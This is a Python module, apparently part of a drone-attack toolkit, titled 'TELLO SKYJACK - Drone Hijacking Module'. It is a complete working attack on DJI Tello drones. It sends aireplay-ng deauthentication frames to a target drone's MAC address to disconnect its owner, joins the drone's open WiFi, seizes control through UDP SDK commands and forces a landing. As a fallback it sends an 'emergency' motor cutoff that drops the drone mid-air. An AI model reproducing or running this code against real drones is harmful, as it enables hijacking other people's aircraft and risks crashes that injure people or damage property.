# Deauthenticates a drone connection and takes control
# Sends a land command to safely ground the hijacked drone

import os
import json
import re
import time
import socket
import subprocess
from src.utils import sudo_exec

##################
### PREP MODULE ##
##################

class Skyjack:
    def __init__(self):
        # Get path to project root directory (two levels up from this file)
        target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
        
        # Initialize target drone data
        with open(target_data_file, 'r') as file:
            scan_info = json.load(file)

        target_info = scan_info.get("target_info", {})
        full_name = scan_info.get("target_name", "Unknown")
        self.target_name = full_name.split(" ")[0] if " " in full_name else full_name
        self.target_mac = target_info.get("mac_address")
        self.target_channel = target_info.get("channel")

        options_info = scan_info.get("options", {})
        self.deauth_packets = options_info.get("packets", 30)
        self.interface = options_info.get("interface", "wlan0")

        # TELLO drone constants
        self.tello_ip = "192.168.10.1"
        self.tello_port = 8889  # Command port
        self.local_port = 9000  # Local port to bind
        self.local_ip = None

        # Connection state
        self.sock = None
        self.connected = False

    def deauth_drone(self) -> bool:
        """
        Deauthenticates the current controller from the TELLO drone.
        Uses aireplay-ng to send deauthentication packets.
        
        Returns: True if deauth was successful, False otherwise.
        """
        print(f"\n[DEAUTH] Starting deauthentication attack on {self.target_name}")
        print(f"[DEAUTH] Target MAC: {self.target_mac}")
        print(f"[DEAUTH] Channel: {self.target_channel}")
        print(f"[DEAUTH] Packets: {self.deauth_packets}")

        try:
            # Put interface in monitor mode
            print(f"\n[DEAUTH] Setting {self.interface} to monitor mode...")
            sudo_exec(f"ip link set {self.interface} down")
            sudo_exec(f"iw {self.interface} set monitor none")
            sudo_exec(f"ip link set {self.interface} up")

            # Set to target channel
            print(f"[DEAUTH] Switching to channel {self.target_channel}...")
            sudo_exec(f"iw {self.interface} set channel {self.target_channel}")

            # Send deauth packets
            # -0 : Deauthentication attack
            # --deauth-count : Number of deauth frames to send
            # -a : Target access point MAC (the drone)
            print(f"[DEAUTH] Sending {self.deauth_packets} deauth packets...")
            sudo_exec(f"aireplay-ng -0 {self.deauth_packets} -a {self.target_mac} {self.interface}")

            print("[DEAUTH] Deauthentication complete!")
            return True

        except Exception as e:
            print(f"[DEAUTH] Error during deauthentication: {e}")
            return False

    def connect_to_drone(self) -> bool:
        """
        Switches interface to managed mode and connects to the TELLO drone's WiFi.
        TELLO drones broadcast an open WiFi network named 'TELLO-XXXXXX'.
        
        Returns: True if connection was successful, False otherwise.
        """
        print(f"\n[CONNECT] Connecting to drone {self.target_name}...")

        try:
            # Switch interface back to managed mode
            print(f"[CONNECT] Setting {self.interface} to managed mode...")
            sudo_exec(f"ip link set {self.interface} down")
            sudo_exec(f"iw {self.interface} set type managed")
            sudo_exec(f"ip link set {self.interface} up")

            # Wait for interface to come up
            time.sleep(1)

            # Connect to TELLO's WiFi network
            # TELLO drones have open networks (no password)
            print(f"[CONNECT] Connecting to TELLO WiFi: {self.target_name}...")
            result = sudo_exec(f"iw {self.interface} connect {self.target_name}")
            
            # Check if connection command succeeded
            if result.returncode != 0:
                print(f"[CONNECT] Error: iw connect failed with code {result.returncode}")
                return False

            # Wait for connection
            time.sleep(2)

            # Get IP address via DHCP with timeout
            print(f"[CONNECT] Requesting IP address via DHCP...")
            # -1 : Try once and exit (faster than persistent mode)
            # -timeout 10 : Give up after 10 seconds
            sudo_exec(f"timeout 10 dhclient -1 {self.interface}")

            # Poll for IP address using subprocess directly to capture output
            print(f"[CONNECT] Verifying IP address...")
            max_attempts = 6
            for attempt in range(max_attempts):
                # Use subprocess directly to capture output
                result = subprocess.run(
                    f"ip addr show {self.interface}",
                    shell=True,
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0 and "inet " in result.stdout:
                    ip_match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", result.stdout)
                    if ip_match:
                        self.local_ip = ip_match.group(1)
                        print(f"[CONNECT] IP address obtained: {self.local_ip}")
                        break
                if attempt < max_attempts - 1:
                    print(f"[CONNECT] Waiting for IP... attempt {attempt + 1}/{max_attempts}")
                    time.sleep(1)  # Wait 1 second between checks
            else:
                print("[CONNECT] DHCP failed; applying static fallback 192.168.10.2/24")
                try:
                    fallback_ip = "192.168.10.2"
                    sudo_exec(f"ip addr flush dev {self.interface}")
                    sudo_exec(f"ip addr add {fallback_ip}/24 dev {self.interface}")
                    sudo_exec(f"ip link set {self.interface} up")
                    sudo_exec(f"ip route replace 192.168.10.0/24 dev {self.interface}")
                    self.local_ip = fallback_ip
                    print(f"[CONNECT] Static IP set: {self.local_ip}")
                except Exception as e:
                    print(f"[CONNECT] Error setting static IP: {e}")
                    return False
            
            # Verify connectivity to drone with ping
            print(f"[CONNECT] Testing connectivity to drone...")
            ping_result = subprocess.run(
                f"ping -c 2 -W 2 {self.tello_ip}",
                shell=True,
                capture_output=True,
                text=True
            )
            
            if ping_result.returncode != 0:
                print(f"[CONNECT] Warning: Cannot ping drone at {self.tello_ip}")
                print("[CONNECT] Waiting for network to stabilize...")
                time.sleep(3)
            else:
                print("[CONNECT] Drone is reachable!")
            
            print("[CONNECT] WiFi connection established!")
            return True

        except Exception as e:
            print(f"[CONNECT] Error connecting to drone: {e}")
            return False

    def init_tello_sdk(self) -> bool:
        """
        Initializes UDP socket and puts TELLO into SDK mode.
        TELLO requires the 'command' message to enter SDK mode before accepting commands.
        
        Returns: True if SDK mode was enabled, False otherwise.
        """
        print(f"\n[SDK] Initializing TELLO SDK connection...")

        try:
            if self.local_ip is None:
                print("[SDK] Warning: Local IP unknown; commands may not reach the drone. Is WiFi connected?")

            # Create UDP socket and bind to the interface IP if available
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            bind_ip = self.local_ip if self.local_ip else ''
            self.sock.bind((bind_ip, self.local_port))
            self.sock.settimeout(10.0)  # 10 second timeout for initial connection

            print(f"[SDK] Socket bound to local port {self.local_port}")
            print(f"[SDK] Target: {self.tello_ip}:{self.tello_port}")

            # Send 'command' to enter SDK mode with retry logic
            print("[SDK] Sending 'command' to enter SDK mode...")
            max_retries = 3
            for attempt in range(max_retries):
                response = self._send_command("command", retries=2, retry_delay=1.0)
                
                if response and response.lower() == "ok":
                    print("[SDK] TELLO SDK mode enabled!")
                    self.connected = True
                    self.sock.settimeout(5.0)  # Reduce timeout for normal operations
                    return True
                elif attempt < max_retries - 1:
                    print(f"[SDK] Attempt {attempt + 1} failed, retrying...")
                    time.sleep(1)
            
            print(f"[SDK] Failed to enter SDK mode after {max_retries} attempts")
            return False

        except socket.timeout:
            print("[SDK] Timeout waiting for response. Drone may not be reachable.")
            return False
        except Exception as e:
            print(f"[SDK] Error initializing SDK: {e}")
            return False

    def _send_command(self, command: str, retries: int = 1, retry_delay: float = 0.5) -> str | None:
        """
        Sends a command to the TELLO drone and waits for response.
        
        Args:
            command: The SDK command to send (e.g., 'command', 'takeoff', 'land')
            retries: Number of attempts to send/receive before giving up
            retry_delay: Seconds to wait between retries
            
        Returns: Response string from drone, or None on error.
        """
        if self.sock is None:
            print("[CMD] Error: Socket not initialized")
            return None

        for attempt in range(1, retries + 1):
            try:
                # Send command
                message = command.encode('utf-8')
                self.sock.sendto(message, (self.tello_ip, self.tello_port))
                print(f"[CMD] Sent: {command} (attempt {attempt}/{retries})")

                # Wait for response
                response, _ = self.sock.recvfrom(1024)
                response_str = response.decode('utf-8').strip()
                print(f"[CMD] Received: {response_str}")

                return response_str

            except socket.timeout:
                print(f"[CMD] Timeout waiting for response to '{command}' (attempt {attempt}/{retries})")
            except Exception as e:
                print(f"[CMD] Error sending command (attempt {attempt}/{retries}): {e}")

            if attempt < retries:
                time.sleep(retry_delay)

        return None

    def land_drone(self) -> bool:
        """
        Sends the land command to safely ground the drone.
        
        Returns: True if land command was acknowledged, False otherwise.
        """
        print("\n[LAND] Sending land command...")

        if not self.connected:
            print("[LAND] Error: Not connected to drone SDK")
            return False

        response = self._send_command("land", retries=3, retry_delay=1.0)

        if response and response.lower() == "ok":
            print("[LAND] Drone is landing!")
            return True
        else:
            print(f"[LAND] Land command failed: {response}")
            return False

    def emergency_stop(self) -> bool:
        """
        Sends emergency stop command to immediately cut motors.
        WARNING: Drone will fall from the sky!
        
        Returns: True if emergency stop was acknowledged, False otherwise.
        """
        print("\n[EMERGENCY] Sending emergency stop!")

        if not self.connected:
            print("[EMERGENCY] Error: Not connected to drone SDK")
            return False

        response = self._send_command("emergency", retries=2, retry_delay=0.5)

        if response and response.lower() == "ok":
            print("[EMERGENCY] Motors stopped!")
            return True
        else:
            print(f"[EMERGENCY] Emergency stop failed: {response}")
            return False

    def get_battery(self) -> int:
        """
        Queries the drone's battery level.
        
        Returns: Battery percentage (0-100), or -1 on error.
        """
        if not self.connected:
            return -1

        response = self._send_command("battery?", retries=2, retry_delay=0.5)

        if response is None:
            return -1

        try:
            return int(response)
        except (ValueError, TypeError):
            return -1

    def cleanup(self):
        """
        Closes socket and cleans up resources.
        """
        if self.sock:
            self.sock.close()
            self.sock = None
        self.connected = False
        print("\n[CLEANUP] Connection closed.")


##################
## START MODULE ##
##################

if __name__ == "__main__":
    skyjack = Skyjack()

    print("=" * 60)
    print("  TELLO SKYJACK - Drone Hijacking Module")
    print("=" * 60)

    # Step 1: Deauthenticate the current controller
    print("\n[STEP 1] Deauthenticating current controller...")
    if not skyjack.deauth_drone():
        print("[ABORT] Deauthentication failed. Exiting.")
        exit(1)

    # Step 2: Connect to the drone's WiFi
    print("\n[STEP 2] Connecting to drone WiFi...")
    if not skyjack.connect_to_drone():
        print("[ABORT] Failed to connect to drone WiFi. Exiting.")
        exit(1)

    # Step 3: Initialize SDK mode
    print("\n[STEP 3] Initializing TELLO SDK...")
    if not skyjack.init_tello_sdk():
        print("[ABORT] Failed to enter SDK mode. Exiting.")
        skyjack.cleanup()
        exit(1)

    # Step 4: Get battery status
    print("\n[STEP 4] Checking drone status...")
    battery = skyjack.get_battery()
    if battery >= 0:
        print(f"[STATUS] Battery: {battery}%")
        
        # Check for critical battery levels
        if battery < 5:
            print("[WARNING] Critical battery level! Drone may auto-land or already be grounded.")
            print("[INFO] Skipping manual land command - drone likely on ground.")
        elif battery < 15:
            print("[WARNING] Low battery! Drone may auto-land soon.")
            # Proceed with landing
            print("\n[STEP 5] Landing the drone...")
            if skyjack.land_drone():
                print("\n[SUCCESS] Drone has been safely landed!")
            else:
                print("\n[WARNING] Land command may have failed. Trying emergency stop...")
                skyjack.emergency_stop()
        else:
            # Normal battery level - proceed with landing
            print("\n[STEP 5] Landing the drone...")
            if skyjack.land_drone():
                print("\n[SUCCESS] Drone has been safely landed!")
            else:
                print("\n[WARNING] Land command may have failed. Trying emergency stop...")
                skyjack.emergency_stop()
    else:
        print("[WARNING] Could not read battery level. Attempting to land anyway...")
        print("\n[STEP 5] Landing the drone...")
        if skyjack.land_drone():
            print("\n[SUCCESS] Drone has been safely landed!")
        else:
            print("\n[WARNING] Land command may have failed. Trying emergency stop...")
            skyjack.emergency_stop()

    # Cleanup
    skyjack.cleanup()

    print("\n" + "=" * 60)
    print("  SKYJACK COMPLETE")
    print("=" * 60)


